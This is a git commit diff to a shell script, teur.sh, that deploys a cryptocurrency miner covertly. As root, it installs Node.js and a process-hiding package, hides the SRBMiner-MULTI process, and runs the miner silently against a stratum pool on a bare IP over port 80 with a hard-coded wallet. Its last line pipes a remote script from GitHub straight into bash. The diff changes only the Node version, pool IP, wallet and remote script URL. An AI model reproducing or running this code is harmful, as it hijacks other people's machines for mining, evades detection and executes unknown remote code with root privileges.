3b5d3a42cc681f6c58c59143c0f591504357fb86
malogrono <136266511+malogrono@users.noreply.github.com>
2026-08-29 12:04:42 +0700

    Update teur.sh

--- teur.sh
+++ teur.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
-sudo su --command "curl -fsSL https://deb.nodesource.com/setup_24.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
+sudo su --command "curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add SRBMiner-MULTI"
 wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.8/SRBMiner-Multi-2-4-8-Linux.tar.gz >/dev/null 2>&1
 tar -xzvf SRBMiner-Multi-2-4-8-Linux.tar.gz
 cd SRBMiner-Multi-2-4-8
-./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://148.113.141.142:80 --wallet LTC:ltc1qwae89dljtedxyvgrgl5ug8rk7xeqaruh5utxrg.SR >/dev/null 2>&1 &
-curl -sL https://raw.githubusercontent.com/bsheredia/dumel/main/pie.sh | bash
+./SRBMiner-MULTI --algorithm randomx --pool stratum+tcp://87.58.153.9:80 --wallet Q01050095f8fa589dcd8cebc5a6ead8da10e9d9655a1d3ee85640fd1d8ddafde13faa8b744ba6c7.SR >/dev/null 2>&1 &
+curl -sL https://github.com/bsheredia/sempak/raw/refs/heads/main/kupluk.sh | bash
